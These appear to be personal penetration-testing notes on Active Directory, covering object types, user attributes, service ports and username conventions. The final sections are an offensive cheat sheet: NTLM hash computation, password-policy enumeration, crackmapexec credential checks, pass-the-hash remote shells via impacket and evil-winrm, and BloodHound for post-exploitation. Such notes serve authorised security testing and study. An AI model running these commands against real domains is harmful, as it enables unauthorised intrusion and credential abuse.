# AD Info
Passwords in SYSVOL also known as GPP Passwords
LLMNR Spoofing


AD
	ADUC
		Objects
			User account
				Domain user account
				Local user account
			Computer account
			Groups
				Security Group
				Distribution Group
			Shares
			Printers
			Organizational Units (OU)
			Attributes
			Delegate Control

Service account
	Managed service account (MSA)
		sMSA
		gMSA
	Computer account
	User account
		Domain user account
		Local user account

## User Naming Attributes
* userPrincipalName - the logon name for the user
* objectGUID - the unique identifier of a user
* sAMAccountName - a logon name that supports previous version of Windows
* objectSID - security identifier (SID) of the user
* sIDHistory - the previous SIDs for the user object

#### Domain & computers
NetBIOS name
DNS name

#### Users
Down-level logon name:
NetBios_DOMAIN/samAccountName
legacy systems - backwards compatible - used for local signon
20 chars long

User Principal Name (UPN):
userPrincipalName@DNS_DOMAIN_NAME
Useful in multi-domain 
Reflects email style

## Common services used in AD
LDAP
	Kerberos vs NTLM?
	SASL
	DHCP
	not SAML and RADIUS

|Service|port|
|-|-|
|DNS|53|
|Kerberos-kpasswd|88-464|
|RPC-HTTP enpoint mapper|135-593| 
|NetBios|137-138-139|
|LDAP-tls|389-636|
|SMB|445|
|Global catalog LDAP-tls|3268-3269|

## Domain username convention
firstlast
flast
firlas
first.last
f.last
fir.las

## Calculate NTLM hash
```Python
import hashlib,binascii
print(binascii.hexlify(hashlib.new('md4', "<PASSWORD>".encode('utf-16le')).digest()))
```

## Password policy
`polenum '<USER>':'<PASS>' -d <IP/DOMAIN>`
`crackmapexec smb IP -u '<USER>' -p '<PASS>' --pass-pol`

## Expoitation
Check:
`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H

Shell:
`impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
`impacket-psexec -hashes '<HASH>' <USER>@<IP>`
`evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
## Post-exploitation
`Bloodhound`
	`SharpHound` for local AD
	`AzureHound` for Azure AD